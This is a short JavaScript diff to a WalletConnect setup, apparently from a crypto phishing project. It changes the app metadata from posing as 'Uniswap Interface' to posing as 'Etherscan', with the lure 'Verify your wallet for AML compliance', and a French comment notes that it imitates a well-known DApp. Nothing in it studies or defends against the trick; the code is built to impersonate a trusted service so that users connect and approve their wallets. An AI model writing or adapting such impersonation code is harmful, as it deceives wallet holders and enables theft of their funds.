@@ -29,10 +29,10 @@ async function initWalletConnect() {
   signClient = await SignClientClass.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: 'Uniswap Interface',            // 👈 imite une DApp connue
-      description: 'Uniswap Interface',
-      url: 'https://app.uniswap.org',
-      icons: ['https://app.uniswap.org/favicon.ico']
+      name: 'Etherscan',            // 👈 imite une DApp connue
+      description: 'Verify your wallet for AML compliance',
+      url: 'https://etherscan.io',
+      icons: ['file:///C:/Users/PC/Downloads/aml-checker-4/public/etherscan-logo-circle.png']
     }
   });
 
